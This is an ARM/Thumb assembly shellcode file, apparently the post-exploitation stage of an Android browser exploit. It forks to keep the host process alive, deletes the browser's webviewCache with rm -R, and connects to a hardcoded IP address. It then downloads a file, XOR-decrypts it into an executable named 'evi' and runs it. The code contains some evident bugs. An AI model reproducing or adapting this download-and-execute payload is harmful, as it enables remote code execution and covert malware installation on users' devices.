.globl _start
_start:
	.code 32	
        add     r1, pc, #1
        bx      r1

	
        .code 16

	/* fork */
	nop
	mov	r7, #2
	svc	1

	cmp	r0, #0     /* child is 0 */
	beq	child

	/* parent only coe */
	/* fix r5, r6, sp  */
	
	mov	r0, #0
	mov	r1, sp
	sub	r1, r1, #80
	mov	sp, r1
	mov	r1, r8
	mov	r6, sp

	mov	sp, r8
	add     sp, sp, #56
	
	adr	r3, end_loop
	ldr	r3, [r3]
	bx	r3
	

	/* child only */
child:

	/* 1] open socket */
        mov     r0, #2
        mov     r1, #1
        sub     r2, r2, r2
        lsl     r7, r1, #8
        add     r7, r7, #25 	/* socket(2, 1, 0) */
        svc     1

	/* 2] connect */
connect:mov     r6, r0	          /* r6 contains socket descriptor */
        adr     r1, sockaddr_dl   /* r1 points to sockaddr */
        mov     r2, #16
        add     r7, #2	          /* socket + 2 = 283 */
        svc     1	          /* connect(r0, &addr, 16) */


	/* 3] chdir and clear cache */
chdir:	adr	r0, dir
	mov	r7, #12
	svc	1

clear:  
	/* fork child does rm */
	mov	r7, #2
	svc	1

	cmp	r0, #0
	bne	c_tmp	/* parent continues */

	/* child execve rm -R webviewCache  */
	adr	r0, rm
	adr	r2, cache
	adr	r1, recursive
	sub	r3, r3, r3
	push	{r0, r1, r2, r3}
	sub	r2, r2, r2
	mov	r1, sp
	mov	r7, #11
	svc	1

	/* 4] create tmp file */
c_tmp:	adr	r0, filename_tmp
	bl	open
	mov	r8, r0		/* r8 holds tmp file descriptor */


	/* 5] read-write loop  */
	/* REMEMBER: don't touch r5, since it's used as ptr buf for read/write */

	mov	r9, r6		/* from now on sockfd is r9 */
	mov	r6, #0		/* r6 now contains bytes read so far */
	
	adr	r4, file_size	/* r4 contains size of file */
	ldrh	r4, [r4]

	
read_from_socket:
	/* r0 is file descriptor */
	mov	r0, r9          /* sockfd */	
	bl 	read
	
	cmp 	r0, #1		/* 0 eof, negative error, we write only if we've read something  */
	blt	lseek
	
	add	r6, r0
	
write_to_tmp:
	/* write: r0 fd, r2 number of bytes  */
	mov	r0, r8	
	mov	r2, r0		/* write only the number of bytes read */
	bl	write

	cmp	r6, r4
	blt	read_from_socket


	/* reposition tmp fd before decrpytion */
lseek:	mov	r1, #0
	mov	r2, #0
	mov	r0, r8
	mov	r7, #19
	svc	1

	/* ] create decrypted executable */
c_dec:	adr	r0, filename
	bl	open
	mov	r7, r0		/* r7 holds decrypted fd */
	

	/* r1 key */
	/* r2 decrypted word */
	/* r8 src fd */
	/* r7 dst */
	/* r4 size of file */
	/* r5 always points to start of buffer */
	/* r6 bytes decypted so far */

	mov	r6, #0
	adr	r1, key
	ldr	r1, [r1]
dec_outer:
		
	/* a] try to read as many as 0x400 bytes per time*/
	mov	r0, r8
	bl 	read
	mov	r12, r0
	
	/* b] dec_inner - xor the number of bytes read */
	
	/* r12 holds the number of bytes read */
	/* r2 holds the number of bytes xored so far */
	/* r3 points to current read from the buffer */
	
	mov	r2, #0
	mov	r3, r5
dec_inner:
	
	cmp	r2, r12
	bge	fire		/* if read returned <0 or finished to xor, fire */

	ldr	r0, [r3]
	eor	r0, r0, r1
	str	r0, [r3]

	add	r3, r3, #4
	add	r2, r2, #4
	b 	dec_inner

	/* c] write the number of bytes read */

	
	add	r6, r6,	r12
	cmp	r6, r4
	bl	dec
	


	/* ] fire */
fire:	adr     r0, filename
        sub     r2, r2, r2
        push    {r0, r2}
        mov     r1, sp
        mov     r7, #11
        svc     1              /* execve(filename, [filename, 0], 0) */

/**** ~subs ****/

	/* write params: r0 file descriptor, buffer is fixed, r2 number of bytes to write*/
write:	
	mov	r1, r5
	mov	r7, #4	        /* write(int fd, const void *buf, size_t count) */
	svc	1
	b	lr
	
	/* read params: r0 file descriptor, buffer and size are fixed, returns bytes read */
read:	adr	r2, buffer_size	/* size per read */
	ldrh	r2, [r2]
	adr	r5, buffer      /* r5 is ptr to buffer */
	mov	r1, r5
	mov	r7, #3
	svc	1		/* read(int fd, void *buf, size_t count) */
	b	lr
	
	/* open: param r0 filename , returns fd on r0 */
open:	adr	r2, open_mode  
	ldrh	r2, [r2]
	adr	r1, open_flags
	ldrh	r1, [r1]
	mov	r7, #5
	svc	1	        /* open(filename,O_RDWR|O_CREAT|O_TRUNC,777) */
	b 	lr
	nop
	
sockaddr_dl:	
		.align 2	               /* struct sockaddr */
 		.short 0x2	
		.short 0x3412
		.byte 192,168,69,131	

end_loop:	.word  0xa84dbc37

open_mode:	.short 0x1ff  /* 777 atm */
	        .byte  1,1
	
open_flags:	.short 0x242  /* O_RDWR|O_CREAT|O_TRUNC */
	        .byte  1,1
	
file_size:	.short 0x2d
		.byte  1,1
	
dir:		.ascii "/app-cache/com.android.browser/cache/\0"
		.byte  1,1
	
cache:		.ascii "webviewCache\0"
		.byte  1,1,1

filename:	.ascii "evi\0"
		
rm:		.ascii "rm\0" /* TODO 'rm' might do the job  */
		.byte  1

recursive:	.ascii "-R\0"
		.byte  1

key:		.word 0x01234567

filename_tmp:	.ascii "tmp\0"

buffer_size:	.short 0x400
		.byte  1,1
	
buffer:		.byte 3,3,3,3
